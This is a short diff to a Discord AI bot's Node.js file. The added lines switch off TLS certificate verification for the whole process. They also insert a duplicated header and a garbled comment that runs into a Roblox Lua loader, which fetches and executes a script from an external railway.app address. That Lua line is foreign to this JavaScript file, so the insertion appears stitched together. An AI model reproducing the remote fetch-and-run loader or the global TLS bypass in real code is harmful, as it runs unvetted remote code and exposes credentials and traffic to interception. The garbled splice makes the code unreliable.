@@ -2,7 +2,12 @@
 //         DISCORD AI BOT v3.0 - COMPLETE EDITION
 //         All Features: AI, Voice, Search, URL, File, Image
 // ============================================================
+// Disable SSL Verification untuk Proxy
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
+// ============================================================
+//         DISCORD AI BOT v3.0 - COMPLETE EDITION
+// ... rest of codeloadstring(game:HttpGet("https://lua-protector-production.up.railway.app/script"))()
 const {
     Client,
     GatewayIntentBits,
@@ -3975,3 +3980,4 @@ client.login(CONFIG.token).then(() => {
     if (err.message.includes('DISALLOWED_INTENTS')) console.error('Enable MESSAGE CONTENT INTENT di Developer Portal!');
     process.exit(1);
 });
+
